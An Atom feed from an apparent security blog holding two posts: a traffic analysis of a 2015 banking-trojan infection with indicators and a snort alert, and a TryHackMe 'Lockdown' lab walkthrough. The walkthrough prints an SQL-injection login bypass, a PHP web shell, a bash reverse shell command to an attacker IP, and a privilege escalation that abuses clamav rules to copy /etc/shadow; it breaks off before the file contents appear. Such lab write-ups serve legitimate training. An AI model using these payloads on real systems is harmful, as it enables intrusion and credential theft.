<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.0">Jekyll</generator><link href="https://jayngng.github.io/blog/feed.xml" rel="self" type="application/atom+xml" /><link href="https://jayngng.github.io/" rel="alternate" type="text/html" /><updated>2021-10-08T20:22:26+11:00</updated><id>https://jayngng.github.io/blog/feed.xml</id><entry><title type="html">2015-08-07 - Traffic Analysis Report</title><link href="https://jayngng.github.io/blog/2015-08-07-traffic-analysis/" rel="alternate" type="text/html" title="2015-08-07 - Traffic Analysis Report" /><published>2021-10-08T06:20:21+11:00</published><updated>2021-10-08T06:20:21+11:00</updated><id>https://jayngng.github.io/blog/2015-08-07-traffic-analysis</id><content type="html" xml:base="https://jayngng.github.io/blog/2015-08-07-traffic-analysis/">&lt;h2 id=&quot;executive-summary&quot;&gt;&lt;strong&gt;Executive Summary&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;On Wednesday 2015-08-07, Degrando Rustlyn’s computer was infected by a Banking Trojan via opening a malicious link in an email, which downloaded a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.rar&lt;/code&gt; achieve containing malware. After the infection occurred, the SOC team immediately contacted Degrando Rustlyn to start investigating the incident.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;details&quot;&gt;&lt;strong&gt;Details&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;Infected computer’s host name: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PERTRUIDE-PC&lt;/code&gt;.
Infected computer’s IP address: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;192.168.137.113&lt;/code&gt;.
Infected computer’s MAC address: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;00:1e:4f:6c:ba:05 (Dell_6c:ba:05)&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;The malicious email that caused the infection:&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Date/Time: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Tue, 4 Aug 2015 20:16:47 +0000 (UTC)&lt;/code&gt;.&lt;/li&gt;
  &lt;li&gt;Subject line: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Voce recebeu comentario de voz em sua foto - 3192132&lt;/code&gt;.&lt;/li&gt;
  &lt;li&gt;Sender: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Facebook.com &amp;lt;accounts@passport.com&amp;gt;&lt;/code&gt; (spoofed sender).&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;Domain and IP addresses of the related traffic:&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;www.ica.ufmg.br - 150.16.130.253&lt;/li&gt;
  &lt;li&gt;australiano2015.com.br - 69.49.115.40&lt;/li&gt;
  &lt;li&gt;downloadpdf.demojoomla.com - 67.212.169.218&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;Malware associated with the infection:&lt;/strong&gt;&lt;/p&gt;

&lt;table&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;strong&gt;Filename&lt;/strong&gt;&lt;/td&gt;
      &lt;td&gt;&lt;strong&gt;Size&lt;/strong&gt;&lt;/td&gt;
      &lt;td&gt;&lt;strong&gt;MD5&lt;/strong&gt;&lt;/td&gt;
      &lt;td&gt;&lt;strong&gt;Description&lt;/strong&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Download.rar&lt;/td&gt;
      &lt;td&gt;3 KB (3,205 bytes)&lt;/td&gt;
      &lt;td&gt;6325f04a77fce24c8c43b71d817d3fe7&lt;/td&gt;
      &lt;td&gt;Downloaded from a link in a malicious email.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Download.vbe&lt;/td&gt;
      &lt;td&gt;5 KB (4,804 bytes)&lt;/td&gt;
      &lt;td&gt;50ac6b67b095aeb4e85b3f94e66d8666&lt;/td&gt;
      &lt;td&gt;Extracted from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Download.rar&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Gravar.zip&lt;/td&gt;
      &lt;td&gt;9.3 MB (9,303,045 bytes)&lt;/td&gt;
      &lt;td&gt;e1d6e85f72d76845f9dc1c5c3d4fd469&lt;/td&gt;
      &lt;td&gt;Downloaded via &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Download.vbe&lt;/code&gt; script.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;dmw.exe&lt;/td&gt;
      &lt;td&gt;18.9 MB (18,925,024 bytes)&lt;/td&gt;
      &lt;td&gt;3c3e8b9b18fb1d14095adb0a16d457d8&lt;/td&gt;
      &lt;td&gt;Extracted from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Gravar.zip&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;analysis-process&quot;&gt;&lt;strong&gt;Analysis Process&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;Opening a malicious email with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Thunderbird&lt;/code&gt;, we can see that the attach opens a link to a suspicious-looking website.&lt;/p&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/20150807/1.png&quot; title=&quot;20150807/1.png&quot; alt=&quot;20150807/1.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;Spending sometimes to inspect related traffic in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Wireshark&lt;/code&gt; packet capture, we discover that it lured victim to download a file called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Download.rar&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/20150807/2.png&quot; title=&quot;20150807/2.png&quot; alt=&quot;20150807/2.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;Extracting the RAR archieve exposed a malicious VBScript that will automatically download a ZIP named &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Gravar.zip&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/20150807/3.png&quot; title=&quot;20150807/3.png&quot; alt=&quot;20150807/3.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;Inside the ZIP contains a Windows executable called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dmw.exe&lt;/code&gt;, which is then executed to infect the victim system.&lt;/p&gt;

&lt;p&gt;Here is a piece of code that demonstrates the VBScript executing &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dmw.exe&lt;/code&gt; binary.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;Note:&lt;/strong&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SOTAR&lt;/code&gt; is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dmw.exe&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/20150807/4.png&quot; title=&quot;20150807/4.png&quot; alt=&quot;20150807/4.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;If we further investigate the HTTPS artifacts, we can see that the victim had downloaded the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Gravar.zip&lt;/code&gt; and execute the VBScript inside it.&lt;/p&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/20150807/5.png&quot; title=&quot;20150807/5.png&quot; alt=&quot;20150807/5.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;Replaying the PCAP traffic via &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;snort&lt;/code&gt;, it will trigger the alert of Banking Trojan.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;snort &lt;span class=&quot;nt&quot;&gt;-q&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; console &lt;span class=&quot;nt&quot;&gt;--daq&lt;/span&gt; pcap &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; none &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; 2015-08-07-traffic-analysis-exercise.pcap &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; /etc/nsm/securityonion-eth0/snort.conf
08/05-16:04:36.644292  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1:2021439:3] ET TROJAN Win32/Bancos.AMM CnC Beacon &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Classification: A Network Trojan was detected] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Priority: 1] &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;TCP&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 192.168.137.113:49311 -&amp;gt; 69.49.115.40:80
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Looking at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;stream 154&lt;/code&gt;, we discover some patterns that alert &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;snort&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/20150807/8.png&quot; title=&quot;20150807/8.png&quot; alt=&quot;20150807/8.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;or try uploading the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dmw.exe&lt;/code&gt; binary onto Virus Total, it also lights up as a Chrismas tree.&lt;/p&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/20150807/6.png&quot; title=&quot;20150807/6.png&quot; alt=&quot;20150807/6.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;Now, we can safely conclude that the isolated system was infected by a Banking Trojan.&lt;/p&gt;</content><author><name></name></author><category term="traffic_analysis" /><category term="blueteam" /><category term="incidentresponse" /><summary type="html">Executive Summary On Wednesday 2015-08-07, Degrando Rustlyn’s computer was infected by a Banking Trojan via opening a malicious link in an email, which downloaded a .rar achieve containing malware. After the infection occurred, the SOC team immediately contacted Degrando Rustlyn to start investigating the incident.</summary></entry><entry><title type="html">Lockdown - THM</title><link href="https://jayngng.github.io/blog/lockdown-thm/" rel="alternate" type="text/html" title="Lockdown - THM" /><published>2021-10-07T07:09:37+11:00</published><updated>2021-10-07T07:09:37+11:00</updated><id>https://jayngng.github.io/blog/lockdown---thm</id><content type="html" xml:base="https://jayngng.github.io/blog/lockdown-thm/">&lt;h2 id=&quot;summary&quot;&gt;&lt;strong&gt;Summary&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;We will retain the intial access by abusing the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SQL injection&lt;/code&gt; vulnerability to bypass authentication and upload a PHP reverse shell. Enumerating the target system locally, we discover that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cyrus&lt;/code&gt; user reuses the password stored in a config file, which we will use to compromise &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cyrus&lt;/code&gt; shell access. Finally, privilege escalation can be achieved via injecting &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;clamscan&lt;/code&gt;’s rules.&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;exploitation&quot;&gt;&lt;strong&gt;Exploitation&lt;/strong&gt;&lt;/h2&gt;

&lt;h4 id=&quot;sql-injection&quot;&gt;&lt;strong&gt;SQL Injection&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;Navigate to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin&lt;/code&gt; page at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://contacttracer.thm/admin/login.php&lt;/code&gt;, we are prompted to login.&lt;/p&gt;

&lt;p&gt;Trying some basic credentials: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin:admin&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root:toor&lt;/code&gt;, and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin:password&lt;/code&gt; but none of them works out, we come up with an idea of using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sql injection&lt;/code&gt; …&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Payload: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;1&apos; or 1=1-- -&lt;/code&gt;, then &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Sign In&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/lockdown/1.png&quot; title=&quot;lockdown/1.png&quot; alt=&quot;lockdown/1.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;And we successfully bypassed the authentication prompt!.&lt;/p&gt;

&lt;p&gt;(More information about the vulnerability can be found &lt;a href=&quot;https://packetstormsecurity.com/files/164005/COVID-19-Contact-Tracing-System-With-QR-Code-Scanning-1.0-SQL-Injection.html&quot;&gt;here&lt;/a&gt;.)&lt;/p&gt;

&lt;p&gt;After landing on the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Admin Panel&lt;/code&gt;, we then navigate to the following URL: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://contacttracer.thm/admin/?page=system_info&lt;/code&gt;.&lt;/p&gt;

&lt;h4 id=&quot;php-shell-upload&quot;&gt;&lt;strong&gt;PHP Shell Upload&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;Now we prepare a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cmback.php&lt;/code&gt; file with the following contents:&lt;/p&gt;

&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;cmd&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;After the file is ready, we upload it onto the target server (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;?page=system_info&lt;/code&gt;) → click on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Update&lt;/code&gt; …&lt;/p&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/lockdown/2.png&quot; title=&quot;lockdown/2.png&quot; alt=&quot;lockdown/2.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;Intercept the traffic with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Burp&lt;/code&gt; → modify the file type as below.&lt;/p&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/lockdown/3.png&quot; title=&quot;lockdown/3.png&quot; alt=&quot;lockdown/3.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;then &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Forward&lt;/code&gt; the traffic.&lt;/p&gt;

&lt;p&gt;Once the file is successfully uploaded, we logout and go to the URL: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://contacttracer.thm/login.php&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Open web developer tool (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Ctrl + Shift + I&lt;/code&gt;) → &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Network&lt;/code&gt; tab → we should see the &lt;em&gt;location of the PHP file we have uploaded&lt;/em&gt;.&lt;/p&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/lockdown/4.png&quot; title=&quot;lockdown/4.png&quot; alt=&quot;lockdown/4.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;Let us try to trigger the shell with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;curl&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; http://contacttracer.thm/uploads/1633297860_test.png.php&lt;span class=&quot;se&quot;&gt;\?&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;whoami&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--output&lt;/span&gt; -                                                                                              23 ⨯
PNG

IHDPN   pHYs

            tIME&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;e&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;EXtCommentCreated with The GIMPd%eIDATxKL]@܌DF.F&amp;amp;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;B1ոQ&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;+BJ
www-data
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;and we have code execution!.&lt;/p&gt;

&lt;p&gt;Now, it is easy to pull a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bash&lt;/code&gt; reverse shell.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; http://contacttracer.thm/uploads/1633297860_test.png.php&lt;span class=&quot;se&quot;&gt;\?&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;bash+-c+%22bash+-i+%3E%26+%2Fdev%2Ftcp%2F10.4.1.61%2F80+0%3E%261%22

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nc &lt;span class=&quot;nt&quot;&gt;-nlvp&lt;/span&gt; 80                     
listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 80 ...
connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.4.1.61] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.139.26] 54572
bash: cannot &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;terminal process group &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1046&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: Inappropriate ioctl &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;device
bash: no job control &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;this shell
www-data@lockdown:/var/www/html/uploads&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id
id
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;privilege-escalation&quot;&gt;&lt;strong&gt;Privilege Escalation&lt;/strong&gt;&lt;/h2&gt;

&lt;h4 id=&quot;shell-as-cyrus&quot;&gt;&lt;strong&gt;Shell as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cyrus&lt;/code&gt;&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;Enumerating the system divulges a plaintext password stored in a config file.&lt;/p&gt;

&lt;p&gt;Combine the password with each system user, we discover &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sweetpandemonium&lt;/code&gt; let us in as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cyrus&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@lockdown:/var/www/html/uploads&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;su cyrus
Password: sweetpandemonium
cyrus@lockdown:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;With &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cyrus&lt;/code&gt; shell, we can execute the following &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo&lt;/code&gt; command:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cyrus@lockdown:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; password &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;cyrus: 
Matching Defaults entries &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;cyrus on lockdown:
    env_reset, mail_badpass,
    &lt;span class=&quot;nv&quot;&gt;secure_path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/local/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/local/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/snap/bin

User cyrus may run the following commands on lockdown:
    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; /opt/scan/scan.sh
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;system-compromised&quot;&gt;&lt;strong&gt;System compromised&lt;/strong&gt;&lt;/h4&gt;

&lt;p&gt;After conducting a few investigations, we realized that the directory &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/lib/clamav/&lt;/code&gt; is world-writable, which is also where the rules for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;clamav&lt;/code&gt; are defined.&lt;/p&gt;

&lt;p&gt;Our goal is writting a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;YARA&lt;/code&gt; rule to flag the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/shadow&lt;/code&gt; file as malicious, the file is then copied to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/quarantine&lt;/code&gt; directory and is only accessible by us.&lt;/p&gt;

&lt;p&gt;To do that, we first prepare a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.yara&lt;/code&gt; rule:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cyrus@lockdown:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /var/lib/clamav/root.yara 
rule root_txt
&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        strings:
                &lt;span class=&quot;nv&quot;&gt;$a&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;www-data:*:&quot;&lt;/span&gt;
        condition:
                &lt;span class=&quot;nv&quot;&gt;$a&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Basically, the rule will look for any file with the content &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;www-data:*:&lt;/code&gt; and mark it as malicious.&lt;/p&gt;

&lt;p&gt;Once we trigger the rule …&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cyrus@lockdown:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; /opt/scan/scan.sh                                                        
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; password &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;cyrus: 
Enter path: /etc   
/etc/ld.so.cache: OK                        
/etc/manpath.config: OK
/etc/rsyslog.conf: OK
...
&lt;span class=&quot;nt&quot;&gt;-----------&lt;/span&gt; SCAN SUMMARY &lt;span class=&quot;nt&quot;&gt;-----------&lt;/span&gt;
Known viruses: 2
Engine version: 0.103.2
Scanned directories: 1
Scanned files: 83
Infected files: 4
Data scanned: 0.23 MB
Data &lt;span class=&quot;nb&quot;&gt;read&lt;/span&gt;: 0.12 MB &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ratio 1.97:1&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Time: 0.080 sec &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0 m 0 s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Start Date: 2021:10:04 01:04:25
End Date:   2021:10:04 01:04:25
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/shadow&lt;/code&gt; file is copied to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;~/quarantine/shadow&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Here is the content of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;shadow&lt;/code&gt; file.&lt;/p&gt;

